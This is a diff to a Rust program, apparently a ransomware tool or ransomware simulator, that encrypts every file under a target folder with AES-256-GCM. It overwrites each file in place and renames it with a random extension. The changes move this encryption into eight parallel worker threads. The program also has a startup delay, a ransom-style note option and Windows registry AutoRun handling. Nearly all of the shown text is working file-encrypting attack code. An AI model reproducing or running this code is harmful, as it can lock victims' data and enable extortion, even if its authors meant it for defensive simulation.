@@ -3,9 +3,11 @@
 // Imports
 // Standard Library
 use std::io::{Read, Write};
+use std::sync::atomic::{AtomicUsize, Ordering};
+use std::sync::Arc;
 use std::{env, fs::{File,rename,remove_dir_all}};
 use std::path::{Path,PathBuf};
-use std::thread::sleep;
+use std::thread::{sleep, spawn, JoinHandle};
 use std::time::Duration;
 
 // Home Directory
@@ -18,6 +20,7 @@ use base64::prelude::*;
 use aes_gcm::aead::consts::U12;
 use aes_gcm::aead::generic_array::GenericArray;
 use aes_gcm::aead::rand_core::RngCore;
+
 // Generating random things
 use rand::{distr::Alphanumeric,Rng};
 
@@ -27,12 +30,16 @@ use walkdir::WalkDir;
 // AEAD Algorithm
 use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead,KeyInit,OsRng}};
 
+// Multithreading
+use crossbeam::channel::unbounded;
+
 // Writing AutoRun association to registry
 #[cfg(target_os="windows")]
 use winreg::{enums::*,RegKey};
 #[cfg(target_os="windows")]
 use windows::Win32::UI::Shell::{SHChangeNotify, SHCNE_ASSOCCHANGED, SHCNF_IDLIST};
 
+//Runtime Configuration Struct
 #[derive(Debug)]
 struct RuntimeConfiguration {
 	run_operation:bool,
@@ -45,6 +52,7 @@ struct RuntimeConfiguration {
 fn parse_arguments(runtime_config:&mut RuntimeConfiguration,commandline_args:&Vec<String>) -> bool {
 	let mut run_argument_provided:bool = false;
 	let mut target_folder_argument_provided:bool = false;
+	let mut extension_provided:bool = false;
 	for (position,argument) in commandline_args.iter().enumerate() {
 		let case_neutral_argument:String = argument.to_lowercase();
 		// Run Operation
@@ -70,6 +78,7 @@ fn parse_arguments(runtime_config:&mut RuntimeConfiguration,commandline_args:&Ve
 		if case_neutral_argument == "-e" {
 			if commandline_args.len()-1 >= position+1 {
 				runtime_config.extension=String::from(commandline_args[position+1].as_str());
+				extension_provided = true;
 			}
 			else {
 				println!("Please supply a value for the file extension!");
@@ -96,7 +105,7 @@ fn parse_arguments(runtime_config:&mut RuntimeConfiguration,commandline_args:&Ve
 			}
 		}
 	}
-	if !((run_argument_provided) && target_folder_argument_provided) {
+	if !((run_argument_provided && target_folder_argument_provided) || (!runtime_config.run_operation && extension_provided && target_folder_argument_provided)) {
 		println!("Please review your arguments and make sure you provide all required values!");
 		print_help();
 		return false;
@@ -120,66 +129,70 @@ fn validate_arguments(runtime_config:&RuntimeConfiguration) -> bool {
 	return true;
 }
 
+
 // Encrypt Target
-fn encrypt(runtime_config:&RuntimeConfiguration, enc_file_count:&mut i32) -> bool {
+fn encrypt(runtime_config:&RuntimeConfiguration, enc_file_count_returned:&mut usize) -> bool {
 	// Sleepy time
 	sleep(Duration::from_secs(60));
 	// Initialise our encryption key and nonce arrays to 0 values
 	let mut enc_key_bytes:[u8;32] = [0u8;32];
 	let mut nonce_bytes:[u8;12] = [0u8;12];
+	let number_of_threads:i8 = 8;
 	
 	// Generate our encryption key using random bytes
 	OsRng.fill_bytes(&mut enc_key_bytes);
-	let key = Key::<Aes256Gcm>::from_slice(&enc_key_bytes);
 
 	// Generate our Nonce using random bytes
 	OsRng.fill_bytes(&mut nonce_bytes);
-	let nonce:&GenericArray<u8,U12> = Nonce::from_slice(&nonce_bytes);
+	let nonce:GenericArray<u8,U12> = *Nonce::from_slice(&nonce_bytes);
+
+	// Initialise all of our thread receivers
+	let mut thread_handles:Vec<JoinHandle<()>> = Vec::<JoinHandle<()>>::new();
+	let (transmit,receive) = unbounded::<PathBuf>();
+	let nonce_arc:Arc<GenericArray<u8,U12>> = Arc::new(nonce);
+	let extension_arc:Arc<String> = Arc::new(runtime_config.extension.clone());
+	let enc_file_count:Arc<AtomicUsize> = Arc::new(AtomicUsize::new(0));
+
+	for _unused in 0..number_of_threads {
+		let receiver_clone = receive.clone();
+		let counter_clone:Arc<AtomicUsize> = Arc::clone(&enc_file_count);
+		let nonce_clone:Arc<GenericArray<u8,U12>> = Arc::clone(&nonce_arc);
+		let extension_clone:Arc<String> = Arc::clone(&extension_arc);
+		let handle = spawn(move || {
+			loop {
+				let operating_path:PathBuf;
+				match receiver_clone.recv() {
+					Ok(received_path) => {
+						operating_path = received_path;
+						if !encrypt_file(operating_path, &enc_key_bytes, &*nonce_clone, &extension_clone.as_str()) {
+							println!("Failed to encrypt file in thread!");
+							continue;
+						}
+						counter_clone.fetch_add(1, Ordering::SeqCst);
+					}
+					Err(_e) => {break}
+				}
+			}
+		});
+		thread_handles.push(handle);
+	}
 
 	for entry in WalkDir::new(runtime_config.target_folder.as_str()).into_iter().filter_map(|e| e.ok()) {
 		if !entry.file_type().is_file() {
 			continue;
 		}
+		match transmit.send(entry.path().to_path_buf()) {
+			Ok(_unused) => {},
+			Err(e) => {println!("Failed to send file to thread: {e}"); continue}
+		}
 		//println!("{}", entry.path().display());
 		// Try opening the file
-		let mut input_file:File;
-		let input_file_result = File::options().read(true).open(entry.path());
-		match input_file_result {
-			Ok(input) => input_file = input,
-			Err(error) => {println!("Error Opening File: {}", error); continue;},
-		}
-
-		//Try reading the file
-		let mut input_file_data:Vec<u8> = Vec::new();
-		match input_file.read_to_end(&mut input_file_data) {
-			Ok(_input_data) => {},
-			Err(e) => {println!("Failed to read file data: {}", e); continue}
-		}
-		// Initialise our AEAD cipher and encrypt
-		let cipher:Aes256Gcm = Aes256Gcm::new(key);
-		let encrypted_file_data:Vec<u8> = cipher.encrypt(nonce, input_file_data.as_ref()).expect("Encryption error encountered!");
-		
-		// Put Nonce at beginning (AEAD common practice)
-		let mut data_to_write:Vec<u8> = Vec::new();
-		data_to_write.extend_from_slice(&nonce);
-		data_to_write.extend(encrypted_file_data);
-		
-		// Open file and overwrite everything
-		let output_file_result = File::options().read(true).write(true).truncate(true).open(entry.path());
-		let mut output_file:File;
-		match output_file_result {
-			Ok(out_file) => {output_file = out_file;},
-			Err(e) => {println!("Error opening file to write encrypted data: {}",e);continue}
-		}
-		match output_file.write_all(&data_to_write) {
-			Ok(_output) => {},
-			Err(e) => {println!("Error writing encrypted data to file: {}",e);continue}
-		}
-		let new_file_name:String = entry.path().to_str().expect("Dont know why we cant get a string back here in new file name declaration!").to_string() + "." + &runtime_config.extension;
-		let rename_result = rename(entry.path(),new_file_name);
-		match rename_result {
-			Ok(_o) => {*enc_file_count+=1},
-			Err(e) => {println!("Error renaming file: {}",e);break}
+	}
+	drop(transmit);
+	for handle in thread_handles {
+		match handle.join() {
+			Ok(_success) => {}
+			Err(_e) => {println!("Threads failed to close!"); return false}
 		}
 	}
 	println!("\n\n\n\nEncryption Key Used: {}\nNonce Used: {}\nExtension Used: {}", hex::encode(enc_key_bytes), hex::encode(nonce_bytes), runtime_config.extension);
@@ -189,7 +202,53 @@ fn encrypt(runtime_config:&RuntimeConfiguration, enc_file_count:&mut i32) -> boo
 			return false;
 		}
 	}
+	*enc_file_count_returned += enc_file_count.load(Ordering::SeqCst);
 	return true;
+}
+
+fn encrypt_file(input_file_path:PathBuf, encryption_key_bytes:&[u8;32], nonce:&GenericArray<u8,U12>, extension:&str) -> bool {
+	let encryption_key = Key::<Aes256Gcm>::from_slice(encryption_key_bytes);
+
+	let mut input_file:File;
+	
+	let input_file_result = File::options().read(true).open(input_file_path.as_path());
+	match input_file_result {
+		Ok(input) => input_file = input,
+		Err(error) => {println!("Error Opening File: {}", error); return false},
+	}
+
+	//Try reading the file
+	let mut input_file_data:Vec<u8> = Vec::new();
+	match input_file.read_to_end(&mut input_file_data) {
+		Ok(_input_data) => {},
+		Err(e) => {println!("Failed to read file data: {}", e); return false}
+	}
+	// Initialise our AEAD cipher and encrypt
+	let cipher:Aes256Gcm = Aes256Gcm::new(encryption_key);
+	let encrypted_file_data:Vec<u8> = cipher.encrypt(nonce, input_file_data.as_ref()).expect("Encryption error encountered!");
+	
+	// Put Nonce at beginning (AEAD common practice)
+	let mut data_to_write:Vec<u8> = Vec::new();
+	data_to_write.extend_from_slice(&nonce);
+	data_to_write.extend(encrypted_file_data);
+	
+	// Open file and overwrite everything
+	let output_file_result = File::options().read(true).write(true).truncate(true).open(input_file_path.as_path());
+	let mut output_file:File;
+	match output_file_result {
+		Ok(out_file) => {output_file = out_file;},
+		Err(e) => {println!("Error opening file to write encrypted data: {}",e);return false}
+	}
+	match output_file.write_all(&data_to_write) {
+		Ok(_output) => {},
+		Err(e) => {println!("Error writing encrypted data to file: {}",e);return false}
+	}
+	let new_file_name:String = input_file_path.to_str().expect("Dont know why we cant get a string back here in new file name declaration!").to_string() + "." + extension;
+	let rename_result = rename(input_file_path,new_file_name);
+	match rename_result {
+		Ok(_o) => {return true},
+		Err(e) => {println!("Error renaming file: {}",e);return false}
+	}
 }
 
 // Create Note
@@ -236,7 +295,6 @@ fn clean(runtime_config:&RuntimeConfiguration) -> bool {
 	if !delete_autorun(runtime_config.extension.clone()){
 		return false;
 	}
-
 	return true
 }
 
@@ -306,9 +364,9 @@ fn delete_autorun(file_extension:String) -> bool {
 
 // Print Help Function
 fn print_help() {
-	println!(r#"Usage: frozencryptor.exe {{run/clean/prep}} -t {{target_folder}} {{-e extension}} {{-r true}}
+	println!(r#"Usage: mfe.exe {{run/clean}} -t {{target_folder}} {{-e extension}} {{-r true}}
 	-t : Folder to use
-	-e : Extension to use (optional argument)
+	-e : Extension to use (optional argument for run, mandatory for clean)
 	-r : Leave a note (optional argument)"#);
 }
 
@@ -318,7 +376,7 @@ fn main() {
 		run_operation:true,
 		extension: rand::rng().sample_iter(&Alphanumeric).take(5).map(char::from).collect(),
 		target_folder: String::from("C:\\Windows\\Temp"),
-		note_required: false
+		note_required: false,
 	};
 	let args:Vec<String> = env::args().collect();
 	//print_help();
@@ -331,7 +389,7 @@ fn main() {
 		return;
 	}
 	if runtime_config.run_operation {
-		let mut enc_file_count:i32 = 0;
+		let mut enc_file_count:usize = 0;
 		if !encrypt(&runtime_config,&mut enc_file_count) {
 			dbg!(runtime_config);
 			return;
